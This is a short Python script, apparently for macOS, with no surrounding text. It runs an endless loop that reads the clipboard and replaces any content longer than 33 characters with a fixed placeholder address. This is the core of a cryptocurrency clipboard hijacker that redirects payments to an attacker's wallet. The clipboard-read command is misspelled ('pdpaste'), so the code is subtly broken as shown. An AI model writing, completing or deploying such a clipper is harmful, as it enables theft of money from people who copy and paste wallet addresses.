import subprocess

destenation_address = b'address'

def get_clipbord():
    p = subprocess.Popen(['pdpaste'], stdout=subprocess.PIPE)
    data = str(p.stdout.read())
    if len(data) > 33:
        swap_address(data)

def swap_address(data):
    p = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE)
    p.stdin.write(destenation_address)
    p.stdin.close()

while True:
    get_clipbord()
